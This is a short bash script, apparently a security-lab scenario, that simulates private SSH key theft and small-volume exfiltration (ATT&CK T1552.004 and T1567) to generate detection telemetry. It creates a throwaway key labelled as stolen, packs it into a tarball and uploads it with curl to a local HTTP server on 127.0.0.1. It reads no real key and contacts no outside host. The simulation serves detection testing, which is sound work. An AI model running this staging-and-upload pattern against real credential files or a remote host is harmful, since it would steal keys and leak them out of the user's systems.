#!/usr/bin/env bash
# SecLab 剧本：在采集窗口内执行（collect.sh 已 cd 到工作区）。载荷无害。
set -euo pipefail
HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")/../.." && pwd)"
# T1552.004：私钥窃取——凭据副本落盘并打包外传（复合 T1567 小体量外传）
ssh-keygen -q -t rsa -b 2048 -N '' -f staged_id_rsa -C stolen-dev-key 2>/dev/null
echo "staged copy of /home/dev/.ssh/id_rsa" > provenance-note.txt
mkdir -p sensitive; cp staged_id_rsa sensitive/
tar czf keys.tar.gz sensitive
python3 -m http.server 18082 >/dev/null 2>&1 & SRV=$!; sleep 0.5
curl -sf -F "f=@keys.tar.gz" http://127.0.0.1:18082/ >/dev/null || true
kill $SRV 2>/dev/null || true
